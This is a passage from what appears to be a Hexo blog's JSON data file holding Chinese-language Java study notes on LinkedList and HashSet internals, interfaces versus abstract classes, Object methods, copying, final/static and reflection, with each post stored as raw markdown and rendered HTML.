class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public E set(int index, E element) &#123;</span><br><span class=\"line\">    //检查是否在范围内</span><br><span class=\"line\">    checkElementIndex(index);</span><br><span class=\"line\">    Node&lt;E&gt; x = node(index);</span><br><span class=\"line\">    E oldVal = x.item;</span><br><span class=\"line\">    //替换</span><br><span class=\"line\">    x.item = element;</span><br><span class=\"line\">    return oldVal;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private void checkElementIndex(int index) &#123;</span><br><span class=\"line\">    if (!isElementIndex(index))</span><br><span class=\"line\">        throw new IndexOutOfBoundsException(outOfBoundsMsg(index));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private boolean isElementIndex(int index) &#123;</span><br><span class=\"line\">     return index &gt;= 0 &amp;&amp; index &lt; size;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//获取指定node</span><br><span class=\"line\">Node&lt;E&gt; node(int index) &#123;</span><br><span class=\"line\">   // assert isElementIndex(index);</span><br><span class=\"line\"></span><br><span class=\"line\">   //从头还是尾开始遍历 二分</span><br><span class=\"line\">   if (index &lt; (size &gt;&gt; 1)) &#123;</span><br><span class=\"line\">       Node&lt;E&gt; x = first;</span><br><span class=\"line\">       for (int i = 0; i &lt; index; i++)</span><br><span class=\"line\">           x = x.next;</span><br><span class=\"line\">       return x;</span><br><span class=\"line\">   &#125; else &#123;</span><br><span class=\"line\">       Node&lt;E&gt; x = last;</span><br><span class=\"line\">       for (int i = size - 1; i &gt; index; i--)</span><br><span class=\"line\">           x = x.prev;</span><br><span class=\"line\">       return x;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-查-get-int-index\"><a href=\"#6-查-get-int-index\" class=\"headerlink\" title=\"(6).查 get(int index)\"></a>(6).查 get(int index)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public E get(int index) &#123;</span><br><span class=\"line\">    checkElementIndex(index);</span><br><span class=\"line\">    return node(index).item;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-Set\"><a href=\"#三-Set\" class=\"headerlink\" title=\"三.Set\"></a>三.Set</h3><p>Set: 不允许有重复数据，去重<br><br>Set主要:HashSet,TreeSet,LinkedHashSet<br></p>\n<p>HashSet:底层为哈希表加红黑树<br><br>TreeSet:底层为红黑树<br><br>LinkedHashSet: 底层为哈希表和一个双向链表<br></p>\n<h5 id=\"1-HashSet\"><a href=\"#1-HashSet\" class=\"headerlink\" title=\"1.HashSet\"></a>1.HashSet</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//map&lt;key, value&gt;</span><br><span class=\"line\">private transient HashMap&lt;E,Object&gt; map;</span><br><span class=\"line\"></span><br><span class=\"line\">//value</span><br><span class=\"line\">private static final Object PRESENT = new Object();</span><br><span class=\"line\"></span><br><span class=\"line\">//构造函数  可以看出实际为HashMap</span><br><span class=\"line\">public HashSet() &#123;</span><br><span class=\"line\">    map = new HashMap&lt;&gt;();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//add 看出value 为 PRESENT</span><br><span class=\"line\">public boolean add(E e) &#123;</span><br><span class=\"line\">    return map.put(e, PRESENT)==null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"接口","date":"2019-01-21T19:26:34.000Z","_content":"\n[接口与抽象类区别](https://blog.csdn.net/u010466329/article/details/78133282)\n\n### 一.例子\n```\npackage base.interfacedemo;\n\n//定义一个接口\ninterface TestInterface {\n\n    void test();\n\n    //接口静态内部类实现 默认 public static final\n    //方便扩展\n    TestInterface Demo1 = new TestInterface() {\n        @Override\n        public void test() {\n            System.out.println(\"test1\");\n        }\n    };\n\n    //default方法 java8新特性\n    default void Demo3(){\n       System.out.println(\"test3\");\n    }\n}\n\n//正常的接口实现\nclass Demo2 implements TestInterface{\n    @Override\n    public void test(){\n        System.out.println(\"test2\");\n    }\n}\n\npublic class DemoInterface{\n\n    public static void main(String[] args){\n        TestInterface.Demo1.test();\n        new Demo2().test();\n        Demo2 demo3 = new Demo2();\n        demo3.Demo3();\n    }\n}\n```\n","source":"_posts/java/interface.md","raw":"---\ntitle: 接口\ndate: 2019-01-21 14:26:34\ntags: [java]\n---\n\n[接口与抽象类区别](https://blog.csdn.net/u010466329/article/details/78133282)\n\n### 一.例子\n```\npackage base.interfacedemo;\n\n//定义一个接口\ninterface TestInterface {\n\n    void test();\n\n    //接口静态内部类实现 默认 public static final\n    //方便扩展\n    TestInterface Demo1 = new TestInterface() {\n        @Override\n        public void test() {\n            System.out.println(\"test1\");\n        }\n    };\n\n    //default方法 java8新特性\n    default void Demo3(){\n       System.out.println(\"test3\");\n    }\n}\n\n//正常的接口实现\nclass Demo2 implements TestInterface{\n    @Override\n    public void test(){\n        System.out.println(\"test2\");\n    }\n}\n\npublic class DemoInterface{\n\n    public static void main(String[] args){\n        TestInterface.Demo1.test();\n        new Demo2().test();\n        Demo2 demo3 = new Demo2();\n        demo3.Demo3();\n    }\n}\n```\n","slug":"java/interface","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hx000x6dcploov41np","content":"<p><a href=\"https://blog.csdn.net/u010466329/article/details/78133282\" target=\"_blank\" rel=\"noopener\">接口与抽象类区别</a></p>\n<h3 id=\"一-例子\"><a href=\"#一-例子\" class=\"headerlink\" title=\"一.例子\"></a>一.例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package base.interfacedemo;</span><br><span class=\"line\"></span><br><span class=\"line\">//定义一个接口</span><br><span class=\"line\">interface TestInterface &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    void test();</span><br><span class=\"line\"></span><br><span class=\"line\">    //接口静态内部类实现 默认 public static final</span><br><span class=\"line\">    //方便扩展</span><br><span class=\"line\">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void test() &#123;</span><br><span class=\"line\">            System.out.println(&quot;test1&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //default方法 java8新特性</span><br><span class=\"line\">    default void Demo3()&#123;</span><br><span class=\"line\">       System.out.println(&quot;test3&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//正常的接口实现</span><br><span class=\"line\">class Demo2 implements TestInterface&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void test()&#123;</span><br><span class=\"line\">        System.out.println(&quot;test2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class DemoInterface&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        TestInterface.Demo1.test();</span><br><span class=\"line\">        new Demo2().test();</span><br><span class=\"line\">        Demo2 demo3 = new Demo2();</span><br><span class=\"line\">        demo3.Demo3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://blog.csdn.net/u010466329/article/details/78133282\" target=\"_blank\" rel=\"noopener\">接口与抽象类区别</a></p>\n<h3 id=\"一-例子\"><a href=\"#一-例子\" class=\"headerlink\" title=\"一.例子\"></a>一.例子</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package base.interfacedemo;</span><br><span class=\"line\"></span><br><span class=\"line\">//定义一个接口</span><br><span class=\"line\">interface TestInterface &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    void test();</span><br><span class=\"line\"></span><br><span class=\"line\">    //接口静态内部类实现 默认 public static final</span><br><span class=\"line\">    //方便扩展</span><br><span class=\"line\">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void test() &#123;</span><br><span class=\"line\">            System.out.println(&quot;test1&quot;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //default方法 java8新特性</span><br><span class=\"line\">    default void Demo3()&#123;</span><br><span class=\"line\">       System.out.println(&quot;test3&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//正常的接口实现</span><br><span class=\"line\">class Demo2 implements TestInterface&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void test()&#123;</span><br><span class=\"line\">        System.out.println(&quot;test2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public class DemoInterface&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\">        TestInterface.Demo1.test();</span><br><span class=\"line\">        new Demo2().test();</span><br><span class=\"line\">        Demo2 demo3 = new Demo2();</span><br><span class=\"line\">        demo3.Demo3();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Java基础","date":"2019-08-19T18:38:34.000Z","_content":"\n# 1.数据类型\n\n[基本数据类型]()\n\n[访问权限]()\n\n[面向对象]()\n\n[理解java中参数传递]()\n\n[杂]()\n","source":"_posts/java/java基础.md","raw":"---\ntitle: Java基础\ndate: 2019-08-19 14:38:34\ntags: [Index2]\n---\n\n# 1.数据类型\n\n[基本数据类型]()\n\n[访问权限]()\n\n[面向对象]()\n\n[理解java中参数传递]()\n\n[杂]()\n","slug":"java/java基础","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hy00106dcp6wolmvs5","content":"<h1 id=\"1-数据类型\"><a href=\"#1-数据类型\" class=\"headerlink\" title=\"1.数据类型\"></a>1.数据类型</h1><p><a href=\"\">基本数据类型</a></p>\n<p><a href=\"\">访问权限</a></p>\n<p><a href=\"\">面向对象</a></p>\n<p><a href=\"\">理解java中参数传递</a></p>\n<p><a href=\"\">杂</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"1-数据类型\"><a href=\"#1-数据类型\" class=\"headerlink\" title=\"1.数据类型\"></a>1.数据类型</h1><p><a href=\"\">基本数据类型</a></p>\n<p><a href=\"\">访问权限</a></p>\n<p><a href=\"\">面向对象</a></p>\n<p><a href=\"\">理解java中参数传递</a></p>\n<p><a href=\"\">杂</a></p>\n"},{"title":"java基础二","date":"2019-06-21T19:59:21.000Z","_content":"\n### 1.抽象类和接口\n###### (1).为什么要有抽象类\n引入抽象方法和抽象类，是Java提供的一种语法工具，对于一些类和方法，引导使用者正确使用它们，减少被误用。<br>\n\n使用抽象方法，而非空方法体，子类就知道他必须要实现该方法，而不可能忽略。<br>\n\n使用抽象类，类的使用者创建对象的时候，就知道他必须要使用某个具体子类，而不可能误用不完整的父类。<br>\n\n总结，1.规范，2.减少误用。<br>\n\n###### (2).有了抽象类为什么还要接口\n抽象类是一个类，Java一个类可以实现多个接口，但只能继承一个类(继承的好处是复用代码)。所以需要接口。<br>\n抽象类和接口是配合而非替代关系，它们经常一起使用，接口声明能力，抽象类提供默认实现，实现全部或部分方法，一个接口经常有一个对应的抽象类。抽象类实现接口部分方法，然后继承于抽象类的类就可以只实现剩下的方法。<br>\n\nCollection接口和对应的AbstractCollection抽象类<br>\nList接口和对应的AbstractList抽象类<br>\nMap接口和对应的AbstractMap抽象类<br>\n\n###### (3).接口和抽象类\n抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类<br>\n\n接口可以类似的看成一个方法全是抽象方法的抽象类。\n\n接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。<br>\n接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。<br>\n\n所以在使用的选择时:\n\n- 使用接口：\n\n需要让不相关的类都实现一个方法<br>\n需要使用多重继承。<br>\n- 使用抽象类：\n\n需要在几个相关的类中共享代码。(实现部分方法)<br>\n需要能控制继承来的成员的访问权限，而不是都为 public。<br>\n需要继承非静态和非常量字段。<br>\n\n### 2.重写与重载\noverride/overload<br>\n\n为了满足里式替换原则，重写有以下三个限制：<br>\n>子类方法的访问权限必须大于等于父类方法；<br>\n>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br>\n>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br>\n\nJVM虚拟机中，重载实际上调用 的封装类型，重写实际上调用的实际类型<br>\n\n### 3.Object\n```\npublic native int hashCode()\n\npublic boolean equals(Object obj)\n\nprotected native Object clone() throws CloneNotSupportedException\n\npublic String toString()\n\npublic final native Class<?> getClass()\n\nprotected void finalize() throws Throwable {}\n\npublic final native void notify()\n\npublic final native void notifyAll()\n\npublic final native void wait(long timeout) throws InterruptedException\n\npublic final void wait(long timeout, int nanos) throws InterruptedException\n\npublic final void wait() throws InterruptedException\n```\n\n###### (1).hashCode()\n采用操作系统底层实现的哈希算法,返回对象的hash值。 同一个对象的哈希码值是唯一的。<br>\n###### (2).equals()\nequals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。<br>\n等价关系：自反性/对称性/传递性/一致性<br>\n```\n自反：x.equals(x); // true\n\n对称：x.equals(y) == y.equals(x); // true\n\n传递：if (x.equals(y) && y.equals(z))\n    x.equals(z); // true;\n\n一致：x.equals(y) == x.equals(y); // true\n```\n###### (3).toString()\n返回 类型(class)@hash的无符号十六进制<br>\n例：ToStringExample@4554617c <br>\n\n### 4.浅拷贝和深拷贝\n在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 = 号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去。<br>\n\n而浅拷贝和深拷贝就是在这个基础之上做的区分，如果在拷贝这个对象的时候，对引用数据类型<Strong>只是进行了引用的传递</Strong>，而没有真实的创建一个新的对象，则认为是浅拷贝。反之，在对引用数据类型进行拷贝的时候，<Strong>创建了一个新的对象，并且复制其内的成员变量</Strong>，则认为是深拷贝。<br>\n\n### 5.final与static\nfinal可以修饰：属性，方法，类，局部变量（方法中的变量）<br>\nstatic可以修饰：属性，方法，代码段，内部类（静态内部类或嵌套内部类）<br>\n\nstatic修饰的属性强调它们只有一个，可以在不new对象的情况下调用，final强调不能修改。static final修饰的属性表示一旦给值，就不可修改，并且可以通过类名访问。<br>\n\n初始化顺序:静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。<br>\n\n### 6.反射\n\n##### 为什么要用反射\n\n反射的核心是可以在运行时才动态加载类的信息。<br>\n利用这个特性，可以使代码变得灵活，如一开始不知道某个类的信息，不能new,但是可以通过配置文件或者插件等引入，使用反射在运行时加载。利用配置文件时，可以将类描述(属性信息)写在配置文件中，不用每次修改代码<br>\n反射会牺牲一点性能。\n","source":"_posts/java/java基础二.md","raw":"---\ntitle: java基础二\ndate: 2019-06-21 15:59:21\ntags:\n---\n\n### 1.抽象类和接口\n###### (1).为什么要有抽象类\n引入抽象方法和抽象类，是Java提供的一种语法工具，对于一些类和方法，引导使用者正确使用它们，减少被误用。<br>\n\n使用抽象方法，而非空方法体，子类就知道他必须要实现该方法，而不可能忽略。<br>\n\n使用抽象类，类的使用者创建对象的时候，就知道他必须要使用某个具体子类，而不可能误用不完整的父类。<br>\n\n总结，1.规范，2.减少误用。<br>\n\n###### (2).有了抽象类为什么还要接口\n抽象类是一个类，Java一个类可以实现多个接口，但只能继承一个类(继承的好处是复用代码)。所以需要接口。<br>\n抽象类和接口是配合而非替代关系，它们经常一起使用，接口声明能力，抽象类提供默认实现，实现全部或部分方法，一个接口经常有一个对应的抽象类。抽象类实现接口部分方法，然后继承于抽象类的类就可以只实现剩下的方法。<br>\n\nCollection接口和对应的AbstractCollection抽象类<br>\nList接口和对应的AbstractList抽象类<br>\nMap接口和对应的AbstractMap抽象类<br>\n\n###### (3).接口和抽象类\n抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类<br>\n\n接口可以类似的看成一个方法全是抽象方法的抽象类。\n\n接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。<br>\n接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。<br>\n\n所以在使用的选择时:\n\n- 使用接口：\n\n需要让不相关的类都实现一个方法<br>\n需要使用多重继承。<br>\n- 使用抽象类：\n\n需要在几个相关的类中共享代码。(实现部分方法)<br>\n需要能控制继承来的成员的访问权限，而不是都为 public。<br>\n需要继承非静态和非常量字段。<br>\n\n### 2.重写与重载\noverride/overload<br>\n\n为了满足里式替换原则，重写有以下三个限制：<br>\n>子类方法的访问权限必须大于等于父类方法；<br>\n>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br>\n>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br>\n\nJVM虚拟机中，重载实际上调用 的封装类型，重写实际上调用的实际类型<br>\n\n### 3.Object\n```\npublic native int hashCode()\n\npublic boolean equals(Object obj)\n\nprotected native Object clone() throws CloneNotSupportedException\n\npublic String toString()\n\npublic final native Class<?> getClass()\n\nprotected void finalize() throws Throwable {}\n\npublic final native void notify()\n\npublic final native void notifyAll()\n\npublic final native void wait(long timeout) throws InterruptedException\n\npublic final void wait(long timeout, int nanos) throws InterruptedException\n\npublic final void wait() throws InterruptedException\n```\n\n###### (1).hashCode()\n采用操作系统底层实现的哈希算法,返回对象的hash值。 同一个对象的哈希码值是唯一的。<br>\n###### (2).equals()\nequals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。<br>\n等价关系：自反性/对称性/传递性/一致性<br>\n```\n自反：x.equals(x); // true\n\n对称：x.equals(y) == y.equals(x); // true\n\n传递：if (x.equals(y) && y.equals(z))\n    x.equals(z); // true;\n\n一致：x.equals(y) == x.equals(y); // true\n```\n###### (3).toString()\n返回 类型(class)@hash的无符号十六进制<br>\n例：ToStringExample@4554617c <br>\n\n### 4.浅拷贝和深拷贝\n在 Java 中，除了基本数据类型（元类型）之外，还存在 类的实例对象 这个引用数据类型。而一般使用 = 号做赋值操作的时候。对于基本数据类型，实际上是拷贝的它的值，但是对于对象而言，其实赋值的只是这个对象的引用，将原对象的引用传递过去。<br>\n\n而浅拷贝和深拷贝就是在这个基础之上做的区分，如果在拷贝这个对象的时候，对引用数据类型<Strong>只是进行了引用的传递</Strong>，而没有真实的创建一个新的对象，则认为是浅拷贝。反之，在对引用数据类型进行拷贝的时候，<Strong>创建了一个新的对象，并且复制其内的成员变量</Strong>，则认为是深拷贝。<br>\n\n### 5.final与static\nfinal可以修饰：属性，方法，类，局部变量（方法中的变量）<br>\nstatic可以修饰：属性，方法，代码段，内部类（静态内部类或嵌套内部类）<br>\n\nstatic修饰的属性强调它们只有一个，可以在不new对象的情况下调用，final强调不能修改。static final修饰的属性表示一旦给值，就不可修改，并且可以通过类名访问。<br>\n\n初始化顺序:静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。<br>\n\n### 6.反射\n\n##### 为什么要用反射\n\n反射的核心是可以在运行时才动态加载类的信息。<br>\n利用这个特性，可以使代码变得灵活，如一开始不知道某个类的信息，不能new,但是可以通过配置文件或者插件等引入，使用反射在运行时加载。利用配置文件时，可以将类描述(属性信息)写在配置文件中，不用每次修改代码<br>\n反射会牺牲一点性能。\n","slug":"java/java基础二","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hz00126dcpe25ihuro","content":"<h3 id=\"1-抽象类和接口\"><a href=\"#1-抽象类和接口\" class=\"headerlink\" title=\"1.抽象类和接口\"></a>1.抽象类和接口</h3><h6 id=\"1-为什么要有抽象类\"><a href=\"#1-为什么要有抽象类\" class=\"headerlink\" title=\"(1).为什么要有抽象类\"></a>(1).为什么要有抽象类</h6><p>引入抽象方法和抽象类，是Java提供的一种语法工具，对于一些类和方法，引导使用者正确使用它们，减少被误用。<br></p>\n<p>使用抽象方法，而非空方法体，子类就知道他必须要实现该方法，而不可能忽略。<br></p>\n<p>使用抽象类，类的使用者创建对象的时候，就知道他必须要使用某个具体子类，而不可能误用不完整的父类。<br></p>\n<p>总结，1.规范，2.减少误用。<br></p>\n<h6 id=\"2-有了抽象类为什么还要接口\"><a href=\"#2-有了抽象类为什么还要接口\" class=\"headerlink\" title=\"(2).有了抽象类为什么还要接口\"></a>(2).有了抽象类为什么还要接口</h6><p>抽象类是一个类，Java一个类可以实现多个接口，但只能继承一个类(继承的好处是复用代码)。所以需要接口。<br><br>抽象类和接口是配合而非替代关系，它们经常一起使用，接口声明能力，抽象类提供默认实现，实现全部或部分方法，一个接口经常有一个对应的抽象类。抽象类实现接口部分方法，然后继承于抽象类的类就可以只实现剩下的方法。<br></p>\n<p>Collection接口和对应的AbstractCollection抽象类<br><br>List接口和对应的AbstractList抽象类<br><br>Map接口和对应的AbstractMap抽象类<br></p>\n<h6 id=\"3-接口和抽象类\"><a href=\"#3-接口和抽象类\" class=\"headerlink\" title=\"(3).接口和抽象类\"></a>(3).接口和抽象类</h6><p>抽象类和抽象方法都使用 abstract 关键字进行声明。如果一个类中包含抽象方法，那么这个类必须声明为抽象类。抽象类和普通类最大的区别是，抽象类不能被实例化，需要继承抽象类才能实例化其子类<br></p>\n<p>接口可以类似的看成一个方法全是抽象方法的抽象类。</p>\n<p>接口的字段只能是 static 和 final 类型的，而抽象类的字段没有这种限制。<br><br>接口的成员只能是 public 的，而抽象类的成员可以有多种访问权限。<br></p>\n<p>所以在使用的选择时:</p>\n<ul>\n<li>使用接口：</li>\n</ul>\n<p>需要让不相关的类都实现一个方法<br><br>需要使用多重继承。<br></p>\n<ul>\n<li>使用抽象类：</li>\n</ul>\n<p>需要在几个相关的类中共享代码。(实现部分方法)<br><br>需要能控制继承来的成员的访问权限，而不是都为 public。<br><br>需要继承非静态和非常量字段。<br></p>\n<h3 id=\"2-重写与重载\"><a href=\"#2-重写与重载\" class=\"headerlink\" title=\"2.重写与重载\"></a>2.重写与重载</h3><p>override/overload<br></p>\n<p>为了满足里式替换原则，重写有以下三个限制：<br></p>\n<blockquote>\n<p>子类方法的访问权限必须大于等于父类方法；<br><br>子类方法的返回类型必须是父类方法返回类型或为其子类型。<br><br>子类方法抛出的异常类型必须是父类抛出异常类型或为其子类型。<br></p>\n</blockquote>\n<p>JVM虚拟机中，重载实际上调用 的封装类型，重写实际上调用的实际类型<br></p>\n<h3 id=\"3-Object\"><a href=\"#3-Object\" class=\"headerlink\" title=\"3.Object\"></a>3.Object</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public native int hashCode()</span><br><span class=\"line\"></span><br><span class=\"line\">public boolean equals(Object obj)</span><br><span class=\"line\"></span><br><span class=\"line\">protected native Object clone() throws CloneNotSupportedException</span><br><span class=\"line\"></span><br><span class=\"line\">public String toString()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native Class&lt;?&gt; getClass()</span><br><span class=\"line\"></span><br><span class=\"line\">protected void finalize() throws Throwable &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void notify()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void notifyAll()</span><br><span class=\"line\"></span><br><span class=\"line\">public final native void wait(long timeout) throws InterruptedException</span><br><span class=\"line\"></span><br><span class=\"line\">public final void wait(long timeout, int nanos) throws InterruptedException</span><br><span class=\"line\"></span><br><span class=\"line\">public final void wait() throws InterruptedException</span><br></pre></td></tr></table></figure>\n<h6 id=\"1-hashCode\"><a href=\"#1-hashCode\" class=\"headerlink\" title=\"(1).hashCode()\"></a>(1).hashCode()</h6><p>采用操作系统底层实现的哈希算法,返回对象的hash值。 同一个对象的哈希码值是唯一的。<br></p>\n<h6 id=\"2-equals\"><a href=\"#2-equals\" class=\"headerlink\" title=\"(2).equals()\"></a>(2).equals()</h6><p>equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。<br><br>等价关系：自反性/对称性/传递性/一致性<br><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">自反：x.equals(x); // true</span><br><span class=\"line\"></span><br><span class=\"line\">对称：x.equals(y) == y.equals(x); // true</span><br><span class=\"line\"></span><br><span class=\"line\">传递：if (x.equals(y) &amp;&amp; y.equals(z))</span><br><span class=\"line\">    x.equals(z); // true;</span><br><span class=\"line\"></span><br><span class=\"line\">一致：x.equals(y) == x.equals(y); // 